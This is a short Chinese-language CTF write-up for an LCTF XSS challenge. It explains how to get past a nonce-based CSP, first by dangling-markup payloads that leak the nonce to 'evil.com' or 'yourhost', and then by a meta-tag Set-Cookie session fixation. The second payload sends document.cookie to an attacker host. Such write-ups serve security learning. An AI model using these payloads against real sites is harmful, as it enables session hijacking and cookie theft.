## writeup 

**这是LCTF的一道题目**

常规的xss，但是有 csp 保护，script-src 有 nonce,需要绕过nonce的限制。

做题思路有两个：
1. 获取nonce，就可以执行任意的javascript了
2. 修改原有的nonce，改成自己已知的值 

### 解法一 

利用dangling markup attack 来获取页面信息。 传入一个未闭合的标签，来把后面内容通过请求直接发出去，因为bot的版本是Chrome60所以可以直接用一个比较常见的payload

#### 第一种payload

```html
<img src='http://yourhost/?key=
```
这样因为<img>标签里的src未单引号闭合所以会把后面的html代码也当做src属性的一部分直到遇到下一个单引号，所以我们可以拿到管理员的nonce

```php 
<?php echo file_get_contents('loghehehaha.txt');?>
<p>comment here</p>
<script nonce="<?=$nonce;?>">var test='test';</script>
```

#### 第二种payload

```html
<iframe src='//evil.com/evil.html' name='
```
**evil.com/evil.html的内容**
```html
<script>
fetch('//evil.com/?p='+escape(name))
</script>
```

### 解法二 

因为这题的nonce是根据session生成的，所以我们可以用<meta>标签来Set-Cookie，把bot的PHPSESSID设置成我们的，这样bot的nonce就和我们的一样。可以通过preview.php拿到我们的nonce。

**Payload**

```html
<meta http-equiv="Set-Cookie" content="PHPSESSID=yoursession; path=/">
<script nonce="yournonce">(new Image()).src='http://yourhost/?cookie='+escape(document.cookie)</script>
```




